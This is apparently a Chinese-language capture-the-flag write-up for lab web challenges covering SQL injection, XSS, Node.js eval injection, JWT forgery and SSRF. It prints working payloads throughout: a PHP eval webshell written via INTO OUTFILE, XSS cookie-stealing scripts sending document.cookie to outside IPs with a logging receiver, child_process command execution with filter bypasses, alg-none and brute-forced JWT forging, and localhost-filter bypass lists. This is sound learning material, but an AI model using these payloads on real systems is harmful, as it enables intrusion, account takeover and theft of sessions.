注意一下时间盲注的时间选择，然后就可以了

![1764040298846-d64adcfa-2bea-4e82-96f3-b76900110bc1.png](./img/CnfOBJ-v8acdaBX2/1764040298846-d64adcfa-2bea-4e82-96f3-b76900110bc1-379314.png)

可以看见演示版本

我盲注的时候出错了，但是还是猜出来了

```javascript
Database: sds
Table: sds_user
[1 entry]
+----+-----------------+--------------+
| id | sds_password    | sds_username |
+----+-----------------+--------------+
| 1  | c\x01Afshowwwww | admin        |
+----+-----------------+--------------+
```

这个是输出的值，但是明显\X01是有误的值，直接猜密码是ctfshow

## 302

方法同上，更改的地方可以护士不见

但是还有另一种方法：

```javascript
userid=a' union select "<?php phpinfo();?>" into outfile "/var/www/html/a.php" #&userpwd=b
```

可以看见这个里面传入了将<?php phpinfo();?>这个东西写进了a.php中，后面的东西注释掉

至于路径是猜的，但是要求这个路径不能是./，因为这个会直接在mysql的目录中运行，会失败

发现不行，里面显示no\_flag

被耍了，急

但是没事，还可以注入后门

```javascript
userid=a' union select "<?php eval($_POST['a']);?>" into outfile "/var/www/html/c.php" #&userpwd=b
```

直接写进去以后蚁剑连接就能找到一个叫flag.php的东西，打开就有flag了

## 303

他是不是看不起我？

![1764050082043-6ba9cc8d-d28f-4ba8-9f8a-3ff1d3802ab7.png](./img/CnfOBJ-v8acdaBX2/1764050082043-6ba9cc8d-d28f-4ba8-9f8a-3ff1d3802ab7-657532.png)

注册的时候userid注入不进去，因为它限制了长度

跳转一下函数发现判断是否登录进去的函数在fun中间，密码就是admin

```javascript
<?php
function sds_decode($str){
	return md5(md5($str.md5(base64_encode("sds")))."sds");
}
echo sds_decode("admin");
?>
```

看一下注入的函数，发现注入的函数中直接拼接了，没有加任何的信息

<font style="color:rgba(0, 0, 0, 0.85);background-color:rgba(0, 0, 0, 0.06);">123' and updatexml(1,concat(0x7e,database()),0)#</font>

使用上面这个语句直接通过报错信息输出信息

concat是拼接，updatexml是报错，其中<font style="color:rgba(0, 0, 0, 0.85);background-color:rgba(0, 0, 0, 0.06);">0x7e</font>是~符号，就是用database()将数据库名称输出出来

```javascript
insert into sds_dpt set sds_name='123' and updatexml(1,concat(0x7e,database()),0)#',sds_address ='1',sds_build_date='2025-10-29',sds_have_safe_card='1',sds_safe_card_num='1',sds_telephone='1';XPATH syntax error: '~sds'
```

输出了错误信息，可以看到数据库名称是sds

然后新增一个错误信息输出`123' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#`

就是检索这个数据库下面的表名

通过表名发现有一个表名叫sds\_fl9g，基本确定这个就是flag

然后就直接获取flag了<code><font style="color:rgb(0, 0, 0);">123' and updatexml(1,concat(0x7e,substr((select * from sds_fl9g),31,60),0x7e),1)#</font></code>

<font style="color:rgb(0, 0, 0);">因为错误输出的长度是有限的，所以需要用substr剪切一下。</font>

## <font style="color:rgb(0, 0, 0);">304</font>

<font style="color:rgb(0, 0, 0);">和上一道题目没有区别</font>

<font style="color:rgb(0, 0, 0);">305</font>

<font style="color:rgb(0, 0, 0);">可以发现反序列化代码</font>

<font style="color:rgb(0, 0, 0);">是从cookie中获取序列化代码</font>

```javascript
class user{
	public $username;
	public $password;
	public function __construct($u,$p){
		$this->username=$u;
		$this->password=$p;
	}
	public function __destruct(){
		file_put_contents($this->username, $this->password);
	}
}
```

```javascript
$user_cookie = $_COOKIE['user'];
if(isset($user_cookie)){
	$user = unserialize($user_cookie);
}
```

是从cookie中的user里面获取东西，然后可以写入文件

# XXS

## 姿势总结

```bash
使用alert进行测试，一般alert能注入的地方location.href也可以
*** : location.href="http://101.32.9.7/cookie.php?cookie="+document.cookie
1. scirpt 标签
<script> 标签用于定义客户端脚本，比如 JavaScript。
<script>alert(1);</script>
<script>alert("xss");</script>
2. img 标签
<img> 标签定义 HTML 页面中的图像。
<img src=1 onerror=alert(1);>
<img src=1 onerror=alert("xss");>
3. input 标签
<input> 标签规定了用户可以在其中输入数据的输入字段。
onfocus 事件在对象获得焦点时发生：
<input onfocus=alert(1);>
竞争焦点，从而触发onblur事件：
<input onblur=alert(1) autofocus><input autofocus>
input 标签的 autofocus 属性规定当页面加载时 元素应该自动获得焦点。可以通过autofocus属性自动执行本身的focus事件，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：
<input onfocus="alert(1);" autofocus>
" οnclick=alert(1)>     这样需要点击一下输入框<br>
" onmouseover=alert(1)>  需要鼠标划过输入框<br>
4. details 标签
<details> 标签通过提供用户开启关闭的交互式控件，规定了用户可见的或者隐藏的需求的补充细节。ontoggle 事件规定了在用户打开或关闭 <details> 元素时触发：
<details ontoggle=alert(1);>
使用details 标签的 open 属性触发ontoggle事件，无需用户去点击即可触发：
<details open ontoggle=alert(1);>
5. svg 标签
<svg> 标签用来在HTML页面中直接嵌入SVG 文件的代码
<svg onload=alert(1);>
6. select 标签
<select> 标签用来创建下拉列表
<select onfocus=alert(1)></select>
通过autofocus属性规定当页面加载时元素应该自动获得焦点，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：
<select onfocus=alert(1) autofocus>
7. iframe 标签
<iframe> 标签会创建包含另外一个文档的内联框架
<iframe onload=alert(1);></iframe>
8. video 标签
<video> 标签定义视频，比如电影片段或其他视频流
<video><source onerror=alert(1)>
9. audio 标签
<audio> 标签定义声音，比如音乐或其他音频流
<audio src=x  onerror=alert(1);>
10. body 标签
<body> 标签定义文档的主体。
<body onload=alert(1);>

onscroll 事件在元素滚动条在滚动时触发。我们可以利用换行符以及autofocus，当用户滑动滚动条的时候自动触发，无需用户去点击触发：
<body
onscroll=alert(1);><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
11. textarea 标签
<textarea> 标签定义一个多行的文本输入控件
<textarea onfocus=alert(1); autofocus>
12. keygen 标签
<keygen autofocus onfocus=alert(1)> //仅限火狐
13. marquee 标签
<marquee onstart=alert(1)></marquee> //Chrome不行，火狐和IE都可以
14. isindex 标签
<isindex type=image src=1 onerror=alert(1)>//仅限于IE
```

## 316

打开题目是一个输入框

![1763605897017-79e49eb4-8331-4a7c-8822-5a7de170add3.png](./img/CnfOBJ-v8acdaBX2/1763605897017-79e49eb4-8331-4a7c-8822-5a7de170add3-198907.png)

输入测试一下能不能html直接写进去

```bash
<script>alert(123)</script>
```

![1763605950090-b7258021-4911-43c2-b09f-633fa08fdb3c.png](./img/CnfOBJ-v8acdaBX2/1763605950090-b7258021-4911-43c2-b09f-633fa08fdb3c-652477.png)

发现显示123，说明可以使用xxs命令注入

然后就需要搭建一个服务器来进入

我这里使用了腾讯云来搭建服务器

![1763606182844-9ec607fd-6432-4d6b-ad9d-379331ef067e.png](./img/CnfOBJ-v8acdaBX2/1763606182844-9ec607fd-6432-4d6b-ad9d-379331ef067e-257563.png)

![1763606292147-59ea8416-fb6b-4336-a76c-476b887c3424.png](./img/CnfOBJ-v8acdaBX2/1763606292147-59ea8416-fb6b-4336-a76c-476b887c3424-341521.png)

使用ssh连接一下

这个时候就需要自己部署一个服务器做一下这个题目了

直接宝塔面板

```bash
wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh && sudo bash install.sh
```

ok了，后面都是图形化的操作界面

下载打开以后下载推荐的配置，下载完成以后新建网站，域名就填外网ip

剩下的随意，之后再新建的网站中建立一个web\*\*\*.php就行了

把脚本到服务器中就行了

```bash
<?php
$cookie = $_GET['cookie'] ?? '无Cookie数据';
$time = date('Y-m-d H:i:s', time());
$logContent = $time . ' | 客户端IP: ' . $_SERVER['REMOTE_ADDR'] . ' | Cookie: ' . $cookie . "\n";
file_put_contents('cookie.txt', $logContent, FILE_APPEND);
echo '数据已接收（在宝塔文件管理中查看 cookie.txt）';
?>
```

这个脚本的目的就是将cookie中的内容加入到cookie.txt这个文件中，类似于日志

<font style="color:rgb(77, 77, 77);">在url参数里面就可以利用下面的获取cookie，这段脚本会立即把浏览器重定向到指定地址，并且会将cookie通过url参数传递。</font>

<font style="color:rgb(77, 77, 77);">相当于js脚本运行了这个网站，本地网站在运行，所以可以直接获取这个网站的cookie，而在php文件中写了记录当前的cookie</font>

<font style="color:rgb(77, 77, 77);">然后将下面这行代码输入进去就行了</font>

```bash
<script>location.href="http://47.96.170.150:360/web316.php?cookie="+document.cookie</script>
```

![1763623817241-0fe849d1-0d96-4f2f-84ff-227bdc00996b.png](./img/CnfOBJ-v8acdaBX2/1763623817241-0fe849d1-0d96-4f2f-84ff-227bdc00996b-489004.png)

可以在服务器中看见这个

## 317

&lt;script>被禁用了，但是还有其他的可以使用，比如说&lt;img >

```bash
<img src=x οnerrοr=alert(1)>
```

## 318
&lt;img> 被禁用了，但是body还能用

```bash
<body onload=***>
```

做到这道题目的时候我的宝塔面板崩掉了，ssh也崩掉了，不知道为什么，但是服务器还是可以访问，而且文件还在

cookie.txt中的内容太多了，需要手动清理一下，使用rm命令删除文件就行了

还有一些姿势

```bash
<div onclick=***>
<iframe οnlοad=***>
<input onfocus=***>
<a href="#" onclick=***>
```

## 319
还可以使用iframe标签

这个鬼服务器用久了就不能继续用了，不知道为什么

发现重启以后其实静态的数据还是在的

## 320
<font style="color:rgb(77, 77, 77);">新增过滤空格,JavaScript支持注释，可以用注释来断开空格位置，这题试试svg标签（用于在网页中嵌入矢量图形）</font>

<font style="color:rgb(77, 77, 77);"><svg/**/οnlοad=alert(1);></font>

## <font style="color:rgb(77, 77, 77);">321-326</font>
<font style="color:rgb(77, 77, 77);">同上，我甚至不知道过滤什么</font>

## <font style="color:rgb(77, 77, 77);">327</font>
![1763803895469-7ec382a3-20a1-47c9-95b8-87517d1be057.png](./img/CnfOBJ-v8acdaBX2/1763803895469-7ec382a3-20a1-47c9-95b8-87517d1be057-241227.png)

收件人必须是admin，不然会出错

这个样子就会将数据储存起来

但是在数据储存的时候会运行程序

## 328
![1763804142058-aca4ae26-5d3a-423f-bf74-b812fe5dc035.png](./img/CnfOBJ-v8acdaBX2/1763804142058-aca4ae26-5d3a-423f-bf74-b812fe5dc035-426457.png)

显示这样一个界面，但是数据应该是直接进sql，所以并不能找出什么东西，只能管理员看到所有的数据

发现还有一个注册面板，可以从注册面板登进去

登陆进去以后可以获取admin的cookie，通过这个cookie到用户登录界面重新登陆一下试一试

![1763805663562-bf5860eb-e515-4828-98b1-060d4fab0da5.png](./img/CnfOBJ-v8acdaBX2/1763805663562-bf5860eb-e515-4828-98b1-060d4fab0da5-093906.png)

我尝试的第一次没有成功，第二次成功了，不知道为什么两次的地址不一样

## 329
说是和上面一道题目一样，但是我的cookie一直成功不了

所以索性直接写一段js代码找一下flag

```bash
<script>
$('.laytable-cell-1-0-1').each(function(index,value){
	if(value.innerText.indexOf('ctfshow{')>-1)
	{location.href='http://101.32.9.7/cookie.php?cookie='+value.innerText}
});
</script>

````

这个代码的意思是直接检索所有的表格的单元格的内的所有内容，直接筛选出含还有ctfshow{的字段然后直接输出出来

## 330
这一道题目和之前的都不一样，因为admin的cookie是随时都在改变的，但是有一个更改密码的功能

修改密码是要求你的cookie和账号的cookie是一样的，但是我们根本不知道admin的cookie

我们不知道但是网站自己知道啊

所以直接让admin自己更改密码，直接登陆进去

```bash
<script>location.href="http://127.0.0.1/api/change.php?p=123456";</script>
````

然后直接用户登录，admin，123456就行

![1763826989762-adadf6d4-d4bb-4dfa-bcc2-ed18c9912c45.png](./img/CnfOBJ-v8acdaBX2/1763826989762-adadf6d4-d4bb-4dfa-bcc2-ed18c9912c45-620814.png)

这道题目因为cookie是随时在变化的，所以不能通过cookie进行任何交换

题目中ctfshow和admin是同一个账号，通过让程序自己进行更改的形式使用正确的cookie更改密码

## 331

过程同上，区别就在更改了POST的传输方式

```bash
<script>$.ajax({url:'http://127.0.0.1/api/change.php',type:'post',data:{p:'123'&#125;&#125;)</script>
```

行了，直接通过

## 332

发现有转账方式，说明需要转账，先确定一下思路

确保cookie是对的的情况下使转账金额达到9999元，所以可以直接找一个可以注入的位置，直接使用相应的JS代码写一个转账

![1763829246617-9db7d293-a36a-41ea-847a-281300291327.png](./img/CnfOBJ-v8acdaBX2/1763829246617-9db7d293-a36a-41ea-847a-281300291327-471301.png)

这个就是转账的包，可以根据这个转账写一个payload

```bash
<script>$.ajax({url:'http://127.0.0.1/api/amount.php',type:'post',data:{u:'q',a:'9999'&#125;&#125;)</script>
```

之后直接购买就行了，如果不行就是靶场的问题，重新开一下靶场就行了

如果显示先登录就需要重新开靶场

## 333

同上

# node\_js

## 334

注意关注一下源代码就能发现

```bash
module.exports = {
  items: [
    {username: 'CTFSHOW', password: '123456'}
  ]
};
```

```bash
var findUser = function(name, password){
  return users.find(function(item){
    return name!=='CTFSHOW' && item.username === name.toUpperCase() && item.password === password;
  });
};
```

这两段代码告诉我们ctfshow几个字符非全大写的用户名和密码就能通过

## 335

题目提示了

![1763898961516-5c4960cb-d4ec-4e77-b8bf-02a869ebb82f.png](./img/CnfOBJ-v8acdaBX2/1763898961516-5c4960cb-d4ec-4e77-b8bf-02a869ebb82f-373379.png)

提示是eval，可以通过eval注入一些东西

```bash
?eval=var a=require('child_process');a.execSync('ls');
```

说明了其中的eval被作为代码执行了，而其中<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0.06);">var a=require('child\_process')</font>是创建子程序运行进程

<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0.06);">a.execSync('ls')</font>是js的shell命令执行函数

## 336

添加了对于两个指令的过滤，但是发现其实可以通过拼接实现

```bash
?eval=var a=require('chil'+'d_pro'+'cess');a['ex'+'ecSync']('ls')
```

其中\[]的方式是拼接函数的名称

注意要把+进行url编译，不然会被识别成空格

## 337

给了一串代码

```javascript
// 1. 引入 Express 框架
var express = require('express');

// 2. 创建路由实例
var router = express.Router();

// 3. 引入 Node.js 内置 crypto 模块（提供加密、哈希计算功能）
var crypto = require('crypto');

// 4. 自定义 MD5 哈希计算函数：接收字符串 s，返回其 16 进制格式的 MD5 结果
function md5(s) {
  return crypto.createHash('md5')  // 创建 MD5 哈希计算实例
    .update(s)                     // 传入待计算的字符串（默认 utf-8 编码）
    .digest('hex');                // 输出 16 进制字符串格式的 MD5 结果（不加 'hex' 则返回 Buffer 二进制）
}

/* GET home page. */  // 注释：该路由处理 GET 方法的根路径（/）请求（首页请求）
// 5. 定义 GET 路由：匹配根路径 /，回调函数处理请求（req=请求对象，res=响应对象，next=下一个中间件）
router.get('/', function(req, res, next) {
  // 6. 设置响应的 Content-Type 为 text/html（告诉客户端返回的是 HTML 格式数据）
  res.type('html');

  // 7. 定义 flag 变量（CTF 题目要保护的目标密钥，实际环境中是真实值，此处用 xxxxxxx 占位）
  var flag='xxxxxxx';

  // 8. 从 GET 参数中获取 a 的值：req.query 是 Express 内置的 GET 参数解析对象
  // 示例：访问 ?a=123 时，req.query.a = '123'；无 a 参数则为 undefined
  var a = req.query.a;

  // 9. 从 GET 参数中获取 b 的值（与 a 参数逻辑一致）
  var b = req.query.b;

  // 10. 核心条件判断（需同时满足 5 个条件才返回 flag，CTF 解题关键）
  if(
    a && b &&                  // 条件1：a 和 b 必须存在（非 undefined、null、空字符串等 falsy 值）
    a.length===b.length &&     // 条件2：a 和 b 的字符串长度必须相等
    a!==b &&                   // 条件3：a 和 b 的字符串内容必须不同
    md5(a+flag)===md5(b+flag)  // 条件4：a+flag 与 b+flag 拼接后的字符串，MD5 哈希值必须相同（MD5 碰撞核心）
  ){
    res.end(flag);  // 11. 满足所有条件：直接返回 flag 给客户端（响应结束）
  }else{
    // 12. 不满足条件：渲染 index 模板页面，传递 msg 变量（值为 'tql'，即“太强了”拼音缩写，纯提示用）
    // 需配合模板引擎（如 EJS、Pug），模板中可通过 <%= msg %> 显示该提示
    res.render('index',{ msg: 'tql'});
  }

});

// 13. 导出路由实例，供主程序（如 app.js）引入并挂载使用
module.exports = router;
```

简而言之就是长度一样，加上flag的md5一样就行了

可以直接用php特性里面的数组卡掉

# JWT

JWT 全称 JSON Web Token。使用 JSON 作为数据载体，通过对称/非对称方式加密方式对数据进行加密并加签，可以安全传输数据保证不被数据篡改。

JWT由头部(Header)、有效载荷(Payload)、签名(Signature)三部分组成，它们之间用点分隔然后每部分数据采用 base64url编码。

头部(Header)包含alg(签名算法)和typ(令牌类型)示例如下：

```bash
{
"alg": "HS256",
"typ": "JWT"
}
```

有效载荷(Payload)包含一些实际需要传输的数据，在这里JWT 规定了以下7个官方字段，供选用

**iss (issuer)：签发人**

**exp (expiration time)：过期时间**

**sub (subject)：主题**

**aud (audience)：受众**

**nbf (Not Before)：生效时间**

**iat (Issued At)：签发时间**

**jti (JWT ID)：编号**

除了官方字段以外，还可以在这个部分定义私有字段，Payload部分示例如下:

```bash
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022
}
```

签名(Signature)这个部分是对头部(Header)和有效载荷(Payload)两部分进行签名，防止数据被篡改。要产生这个部分需要有经过base64url编码的头部，和经过base64url编码的有效载荷，同时服务器还要有一个密钥。然后用头部中指定的加密算法，例如下面的HMACSHA256算法

```bash
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  your-256-bit-secret
)
```

产生签名。签名出来之后把头部，有效载荷，签名三个部分用点分隔拼成一个字符串。完成之后就是完整的jwt。

## 345

打开靶场，发现源代码有提示

![1763515289759-3ae3324b-e56f-47b5-b011-b01bfa5ec75a.png](./img/CnfOBJ-v8acdaBX2/1763515289759-3ae3324b-e56f-47b5-b011-b01bfa5ec75a-386521.png)

提示我们用admin，直接抓包看一下

![1763515217726-99779ad4-dff9-4b2e-acec-50d50b1803dd.png](./img/CnfOBJ-v8acdaBX2/1763515217726-99779ad4-dff9-4b2e-acec-50d50b1803dd-216973.png)

其中cookie解码看一下

`{"alg":"None","typ":"jwt"}.[{"iss":"admin","iat":1763515033,"exp":1763522233,"nbf":1763515033,"sub":"user","jti":"6d3d1a94e3c31fdef0b3c6e522b68acd"}]`

发现这个是一个json文件的格式，将sub改成admin再次传入试一下

发现还是不行， 再看一下提示发现是传入/admin/这个目录下的文件才能通过

<font style="color:rgb(77, 77, 77);">这里只需要注意访问的是/admin/而不是/admin因为访问/admin表示访问admin.php而访问/admin/表示访问的是admin目录下默认的index.php</font>

![1763515615906-f9cf76da-1f00-473d-8062-a74ff4fae834.png](./img/CnfOBJ-v8acdaBX2/1763515615906-f9cf76da-1f00-473d-8062-a74ff4fae834-963106.png)

![1763515638464-5018c31f-2696-447c-96fd-71e47306b843.png](./img/CnfOBJ-v8acdaBX2/1763515638464-5018c31f-2696-447c-96fd-71e47306b843-572272.png)

再次尝试，通过

*不知道为什么有两个index.php*

## 346

提示同上

抓包看一下

![1763515863571-2d500779-969e-4893-84f5-c86d90ee90db.png](./img/CnfOBJ-v8acdaBX2/1763515863571-2d500779-969e-4893-84f5-c86d90ee90db-805033.png)

看起来和上一道题目一样

但是看上去解码失败了，jti不完整

![1763516167101-1f1d869a-6cae-4d26-be8c-b8e0eca2d92b.png](./img/CnfOBJ-v8acdaBX2/1763516167101-1f1d869a-6cae-4d26-be8c-b8e0eca2d92b-554042.png)

发现解压出来的东西是一样的

写一个python代码生成jwt

```bash
import jwt

payload = {
  "iss": "admin",
  "iat": 1763515781,
  "exp": 1763522981,
  "nbf": 1763515781,
  "sub": "admin",
  "jti": "de539d371780581a0b40c663da427a2a"
}

headers = {
  "alg": "none",
  "typ": "JWT"
}

json_web_token = jwt.encode(payload=payload, key="", algorithm="none", headers=headers)
print(json_web_token)

```

输出结果是eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTc2MzUxNTc4MSwiZXhwIjoxNzYzNTIyOTgxLCJuYmYiOjE3NjM1MTU3ODEsInN1YiI6ImFkbWluIiwianRpIjoiZGU1MzlkMzcxNzgwNTgxYTBiNDBjNjYzZGE0MjdhMmEifQ.

发现和直接解码出来的区别是有没有了后面一堆的后缀，展示出来是段乱码

![1763516904632-0b0d3162-bd01-4973-b80b-9e19dfbc68b7.png](./img/CnfOBJ-v8acdaBX2/1763516904632-0b0d3162-bd01-4973-b80b-9e19dfbc68b7-021982.png)

是这个部分

如果不加这些直接base64编码就能通过

注意后面要加一个.号

ctfshow{bb05be61-2464-4991-af34-d2c1d798a9de}

## 347

看起来都差不多

但是后面有一段签名，要求我们找出这一段签名是什么

使用jwt\_tool工具枚举签名是什么

```bash
python jwt_tool.py [JWT令牌/目标URL] [参数]
```

| `-C -d 字典路径` | 字典模式破解密钥（每行一个候选密钥） | `python jwt_tool.py [JWT] -C -d "C:\weak_keys.txt"` |
| :--- | :--- | :--- |
| `-C -b 长度范围` | 暴力枚举破解（指定密钥长度，如 4-8 位） | `python jwt_tool.py [JWT] -C -b 4-8` |
| `-C -w` | 使用工具内置弱密钥字典破解 | `python jwt_tool.py [JWT] -C -w` |
| `-C -d 字典 -t 线程数` | | |

枚举出来密码是123456

![1763552828717-ffe5b8c9-fd64-40cc-a53c-4b899b526381.png](./img/CnfOBJ-v8acdaBX2/1763552828717-ffe5b8c9-fd64-40cc-a53c-4b899b526381-633006.png)

写一个代码生成一下jwt

```bash
import jwt
from datetime import datetime

# 1. 核心配置：指定签名算法和密码（密钥）
SIGN_ALGORITHM = "HS256"  # 对称加密算法（推荐HS256/HS512，安全性更高）
SECRET_PASSWORD = "123456"  # 用于生成签名的密码（可替换为任意字符串，越长越安全）

# 2. JWT 载荷（Payload）
payload = {
    "iss": "admin",  # 签发者
    "iat": 1763550566,  # 签发时间（时间戳）
    "exp": 1763557766,  # 过期时间（时间戳）
    "nbf": 1763550566,  # 生效时间（时间戳）
    "sub": "admin",  # 主题（通常是用户名/用户ID）
    "jti": "de539d371780581a0b40c663da427a2a"  # 唯一标识
}

# 3. JWT 头部（Header）：算法自动与签名算法对齐
headers = {
    "alg": SIGN_ALGORITHM,  # 必须与签名算法一致（HS256/HS512等）
    "typ": "JWT"  # 令牌类型（固定为JWT）
}

# 4. 根据密码生成带签名的 JWT（核心步骤）
try:
    # encode 方法：用密码（SECRET_PASSWORD）作为密钥，按指定算法生成签名
    json_web_token = jwt.encode(
        payload=payload,
        key=SECRET_PASSWORD,  # 密码即密钥（对称算法的核心）
        algorithm=SIGN_ALGORITHM,
        headers=headers
    )
    
    # 打印结果
    print("生成的带签名 JWT：")
    print(json_web_token)
    print("\nJWT 结构解析（Header.Payload.Signature）：")
    parts = json_web_token.split(".")
    print(f"Header（Base64编码）: {parts[0]}")
    print(f"Payload（Base64编码）: {parts[1]}")
    print(f"Signature（密码生成的签名）: {parts[2]}")

except Exception as e:
    print(f"生成 JWT 失败：{e}")

# # 5. 验证签名（可选，用于验证 JWT 合法性）
# try:
#     # decode 方法：用相同密码验证签名，同时校验过期时间等
#     decoded_payload = jwt.decode(
#         jwt=json_web_token,
#         key=SECRET_PASSWORD,
#         algorithms=[SIGN_ALGORITHM],
#         options={"verify_exp": True}  # 验证过期时间（默认开启）
#     )
#     print("\n签名验证成功！解码后的 Payload：")
#     print(decoded_payload)
# except jwt.ExpiredSignatureError:
#     print("\n签名验证失败：JWT 已过期")
# except jwt.InvalidSignatureError:
#     print("\n签名验证失败：密码错误或 JWT 被篡改")
# except Exception as e:
#     print(f"\n签名验证失败：{e}")
```

输入就可以得到flag

## 348

过程同上，密码是aaab

## 349

给了一个app.js

```bash
/* GET home page. */
router.get('/', function(req, res, next) {
  res.type('html');#html类型
  var privateKey = fs.readFileSync(process.cwd()+'//public//private.key');#利用私钥生成
  var token = jwt.sign({ user: 'user' }, privateKey, { algorithm: 'RS256' });#使用RS256方式加密
  res.cookie('auth',token);#写在cookie中
  res.end('where is flag?');
  
});

router.post('/',function(req,res,next){
	var flag="flag_here";
	res.type('html');
	var auth = req.cookies.auth;
	var cert = fs.readFileSync(process.cwd()+'//public/public.key');  // get public key #读取本地的公钥
	jwt.verify(auth, cert, function(err, decoded) { #使用公钥验证 JWT 令牌的合法性，并解码出 JWT 中的载荷（Payload）数据。
	  if(decoded.user==='admin'){
	  	res.end(flag);
	  }else{
	  	res.end('you are not admin');
	  }
	});
});
```

自己建一个网站看一眼

##### 1、生成一份对公钥和私钥‘

密钥生成网站：<https://travistidwell.com/jsencrypt/demo/>

保存为private.key和public.key

放入项目的public目录下

##### 2、搭建本地网站

###### <font style="color:rgb(0, 0, 0);">1. 创建项目文件夹</font>

新建一个文件夹（如 `jwt-demo`），项目结构最终如下：

```plain
jwt-demo/          # 项目根目录
├── public/        # 存放密钥文件
│   ├── private.key # 私钥（签名 JWT）
│   └── public.key  # 公钥（验证 JWT）
├── app.js         # 核心代码（Express 服务）
└── package.json   # 依赖配置文件
```

###### <font style="color:rgb(0, 0, 0);">2. 初始化项目 + 安装依赖</font>

打开 CMD，进入项目根目录（`cd 你的项目路径/jwt-demo`），执行以下命令：

```bash
# 1. 初始化项目（生成 package.json，一路回车默认配置）
npm init -y

# 2. 安装核心依赖（Express + JWT + Cookie 解析）
npm install express jsonwebtoken cookie-parser fs-extra
```

* `express`：Node.js Web 框架（搭建网站核心）。
* `jsonwebtoken`：JWT 生成 / 验证库（对应代码中的 `jwt` 对象）。
* `cookie-parser`：解析客户端 Cookie（让 `req.cookies` 生效）。
* `fs-extra`：增强的文件操作（兼容原生 `fs`）。

##### <font style="color:rgb(0, 0, 0);">3. 编写核心代码（app.js）</font>

在项目根目录创建 `app.js` 文件，复制以下代码（还原你提供的路由逻辑，补充必要依赖和配置）：

```bash
// 1. 引入依赖
const express = require('express');
const jwt = require('jsonwebtoken');
const fs = require('fs');
const cookieParser = require('cookie-parser');
const path = require('path');

// 2. 初始化 Express 应用
const app = express();
const port = 3000; // 本地端口（可修改为 8080 等）
```

##### <font style="color:rgb(0, 0, 0);">4. 放置密钥文件</font>

将之前生成的 `private.key` 和 `public.key` 两个文件，复制到项目的 `public` 文件夹中（确保路径正确：`jwt-demo/public/private.key`）。

##### <font style="color:rgb(0, 0, 0);">5. 启动服务器</font>

在 CMD 中进入项目根目录，执行：

```bash
node app.js
```

若输出以下内容，说明服务器启动成功：

```plain
Local server started! Visit: http://localhost:3000
POST request can be sent to: http://localhost:3000
```

##### <font style="color:rgb(0, 0, 0);">6. 测试流程（验证功能）</font>

###### <font style="color:rgb(0, 0, 0);">1：访问 GET 路由（获取 JWT 令牌）</font>

* 打开浏览器，访问 `http://localhost:3000`。
* 页面显示 `where is flag?`，此时服务器已将 JWT 令牌写入浏览器 Cookie（键为 `auth`）。
* 验证 Cookie：浏览器按 F12 → 开发者工具 → Application → Cookies → `http://localhost:3000`，可看到 `auth` 字段（值为 JWT 令牌）。

###### <font style="color:rgb(0, 0, 0);">2：发送 POST 路由（验证 JWT 身份）</font>

当前 JWT 的 `user` 是 `user`，所以直接访问 POST 路由会返回「不是 admin」。

搭建网站好后就可以了

web350

这个题也考JWT的三种常见的攻击方式之一把非对称算法 RS256 改为对称算法 HS256，用泄露的公钥签名数据，服务器尝试用公钥作为 secret 验证签名。也就是CVE-2016-5431漏洞

首先题目给了源码，然后和之前一样访问/public.key可以拿到公钥文件，那就和之前一样本地自己搭一下然后访问拿到新的jwt。这里注意一下要将源码的//routes换成//public然后将user换成admin。

# SSRF

## 351

```javascript
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
//作用：控制是否在响应结果中包含 HTTP 响应头（Header）。
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//控制 cURL 执行后是否返回响应结果（而非直接输出）。以字符串形式返回
$result=curl_exec($ch);
// 执行请求并获取响应
curl_close($ch);
echo ($result);
?>
```

crul\_exec发送的请求是url形式，可以加GET和POST参数

这道题目直接`url=file://var/www/html/flag.php`

但是发现不行，可能是因为文件访问的权限不行

`url=[http://127.0.0.1/flag.php](http://127.0.0.1/flag.php)`

## 352

```javascript
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|127.0.0/')){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?>
```

简而言之不能用`localhost`和`127.0.0`，那我们绕过就行了

```plain
八进制：0177.0.0.1；十六进制：0x7f.0.0.1；十进制：2130706433
利用[::]，http://[::]:80/ 会解析为 http://127.0.0.1
添加端口号，http://127.0.0.1:8080
利用句号，127。0。0。1 会解析为 127.0.0.1
url=http://0.0.0.0/flag.php
url=http://0/flag.php
url=http://127.127.127.127/flag.php
```

## 353

```php
<?php
  error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
  if(!preg_match('/localhost|127\.0\.|\。/i', $url)){
    $ch=curl_init($url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $result=curl_exec($ch);
    curl_close($ch);
    echo ($result);
  }
  else{
    die('hacker');
  }
}
else{
  die('hacker');
}
?>
```

又过滤了句号和127.0.开头的

同上

## 354

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|1|0|。/i', $url)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
